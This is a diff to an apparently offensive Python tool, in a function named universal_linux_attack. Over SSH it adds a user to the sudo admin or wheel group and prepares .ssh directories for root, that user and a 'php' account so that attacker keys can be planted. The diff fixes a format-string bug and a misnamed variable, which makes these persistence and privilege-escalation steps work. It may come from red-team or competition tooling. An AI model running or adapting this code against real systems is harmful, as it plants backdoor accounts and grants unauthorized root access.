@@ -83,20 +83,20 @@ def universal_linux_attack(host):
 
     # add user to sudoers
     print("Adding user {0} to sudoers on {1}.".format(username, host.ip))
-    sudo_add_cmd = "usermod -a -G admin {0}} || usermod -a -G wheel {0}".format(username)
+    sudo_add_cmd = "usermod -a -G admin {0} || usermod -a -G wheel {0}".format(username)
     ssh.prompt()
     ssh.sendline(sudo_add_cmd)
 
     
     # Add SSH keys
-    user_directory = {
+    user_directories = {
         "root" : "/root",
         username : "/home/{}".format(username),
         "php" : "/home/php"
     }
     ssh_pub_key = get_ssh_pub()
 
-    for user, directory in user_dirs.items():
+    for user, directory in user_directories.items():
         sshdir_make_cmd = "mkdir -p {}".format(directory)
         sshdir_perms_cmd = "chmod 700 {1} && chown {0}:{0} {1}".format(user, directory)
         
